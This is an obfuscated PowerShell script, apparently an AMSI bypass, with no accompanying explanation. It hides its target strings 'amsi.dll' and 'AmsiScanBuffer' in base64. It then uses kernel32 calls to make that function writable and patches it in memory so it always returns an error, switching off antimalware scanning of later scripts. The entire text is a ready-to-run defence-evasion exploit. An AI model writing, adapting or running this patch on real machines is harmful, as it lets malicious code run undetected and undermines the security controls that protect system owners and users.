$jsdiner = @"
using System;
using System.Runtime.InteropServices;

public class Djinn32 {
    
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $jsdiner
$RoadPrimary = [Djinn32]::LoadLibrary([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQAuAGQAbABsAA==')))
$RedDress = [Djinn32]::GetProcAddress($RoadPrimary, ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')) + [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwBjAGEAbgBCAHUAZgBmAGUAcgA='))))
$linearTime = 0
[Djinn32]::VirtualProtect($RedDress,[uint32]5, 0x40, [ref]$linearTime)
$Catch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Catch, 0, $RedDress, 6)
